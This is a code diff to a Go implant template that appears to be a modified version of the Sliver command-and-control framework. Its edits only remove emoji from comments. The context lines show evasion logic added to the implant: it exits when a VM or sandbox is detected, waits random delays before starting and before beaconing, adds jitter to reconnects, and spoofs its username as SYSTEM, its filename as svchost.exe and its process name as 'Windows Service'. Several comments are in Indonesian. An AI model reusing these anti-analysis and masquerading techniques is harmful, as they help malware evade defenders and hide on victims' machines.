@@ -77,7 +77,7 @@ func init() {
 	InstanceID = id.String()
 }
 
-// 🎯 ANTI-ANALYSIS FUNCTIONS
+// ANTI-ANALYSIS FUNCTIONS
 func isVM() bool {
 	// Check for virtual machine indicators
 	hostname, _ := os.Hostname()
@@ -162,12 +162,12 @@ func {{.}} () {
 // {{end}}
 
 func main() {
-	// 🎯 ANTI-ANALYSIS CHECK - Exit jika dalam VM/Sandbox
+	// ANTI-ANALYSIS CHECK - Exit jika dalam VM/Sandbox
 	if isVM() || isSandbox() {
 		os.Exit(0)
 	}
 
-	// 🎯 RANDOM INITIAL DELAY - 0-2 menit
+	// RANDOM INITIAL DELAY - 0-2 menit
 	initialDelay := time.Duration(insecureRand.Intn(120)) * time.Second
 	time.Sleep(initialDelay)
 
@@ -205,7 +205,7 @@ func main() {
 
 // {{if .Config.IsBeacon}}
 func beaconStartup() {
-	// 🎯 EXTRA RANDOM DELAY UNTUK BEACON - 0-1 menit
+	// EXTRA RANDOM DELAY UNTUK BEACON - 0-1 menit
 	beaconDelay := time.Duration(insecureRand.Intn(60)) * time.Second
 	time.Sleep(beaconDelay)
 
@@ -231,7 +231,7 @@ func beaconStartup() {
 			}
 		}
 		reconnect := transports.GetReconnectInterval()
-		// 🎯 JITTER UNTUK RECONNECT - 0-60 detik
+		// JITTER UNTUK RECONNECT - 0-60 detik
 		jitter := time.Duration(insecureRand.Intn(60)) * time.Second
 		reconnect = reconnect + jitter
 		
@@ -730,7 +730,7 @@ func registerSliver() *sliverpb.Register {
 
 		// Gracefully error out
 		currentUser = &user.User{
-			Username: "SYSTEM", // 🎯 SPOOF: Default ke SYSTEM
+			Username: "SYSTEM", // SPOOF: Default ke SYSTEM
 			Uid:      "S-1-5-18",
 			Gid:      "S-1-5-18",
 		}
@@ -743,7 +743,7 @@ func registerSliver() *sliverpb.Register {
 		if 0 < len(os.Args) {
 			filename = os.Args[0]
 		} else {
-			filename = "svchost.exe" // 🎯 SPOOF: Default filename
+			filename = "svchost.exe" // SPOOF: Default filename
 		}
 	}
 
@@ -754,7 +754,7 @@ func registerSliver() *sliverpb.Register {
 	// {{end}}
 
 	return &sliverpb.Register{
-		Name:              "Windows Service", // 🎯 SPOOF: Process name
+		Name:              "Windows Service", // SPOOF: Process name
 		Hostname:          hostname,
 		Uuid:              uuid,
 		Username:          currentUser.Username,
